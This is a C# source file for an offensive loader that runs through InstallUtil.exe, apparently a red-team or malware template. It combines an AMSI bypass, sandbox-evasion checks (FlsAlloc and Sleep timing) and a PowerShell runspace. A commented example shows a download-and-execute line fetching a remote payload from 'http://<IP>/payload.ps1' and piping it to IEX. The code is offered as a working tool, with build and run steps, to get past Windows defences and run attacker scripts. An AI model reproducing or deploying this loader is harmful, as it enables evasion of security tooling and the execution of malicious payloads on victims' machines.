// =============================================================================
// InstallUtil Runspace Loader with C#-Native AMSI Bypass
//
// Executed via: InstallUtil.exe /U loader.exe
//
// Evasion layers:
//   1. C#-native AMSI bypass - corrupts AmsiUtils.amsiContext before runspace creation
//   2. No PowerShell text     - the bypass is pure C#, no amsi.txt download needed
//   3. Sandbox checks        - FLS callback check + Sleep timing check
//
// Use this loader when your payload needs to execute PowerShell commands
// (e.g., downloading and running a PS script) but you want to avoid the
// AMSI signatures that come with PowerShell-based bypass scripts.
//
// Build:
//   .\compile.bat
//
// Execute:
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U loader.exe
// =============================================================================

using System;
using System.Collections;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Runtime.InteropServices;

namespace RunspaceLoader
{
    // Empty entry point - required for /target:exe compilation.
    // InstallUtil.exe /U invokes Uninstall(), not Main().
    internal class Program
    {
        static void Main(string[] args) { }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        // -- P/Invoke: sandbox checks ----------------------------------------
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError=true)] static extern UInt32 FlsAlloc(IntPtr lpCallback);

        public override void Uninstall(IDictionary savedState)
        {
            // -- 1. Sandbox checks -------------------------------------------
            if (FlsAlloc(IntPtr.Zero) == 0xFFFFFFFF) return;

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return;

            // -- 2. C#-native AMSI bypass ------------------------------------
            AmsiBypass.Disable();

            // -- 3. Create PowerShell runspace and execute -------------------
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            // -- Add your PowerShell here ------------------------------------
            // Example: download and execute a payload
            // ps.AddScript("(New-Object System.Net.WebClient).DownloadString('http://<IP>/payload.ps1') | IEX");
            //
            // Example: run a local script
            // ps.AddScript("C:\\Users\\Public\\script.ps1");
            //
            // Example: inline command
            ps.AddScript("Write-Output 'Runspace loader executed'");

            ps.Invoke();
            rs.Close();
        }
    }
}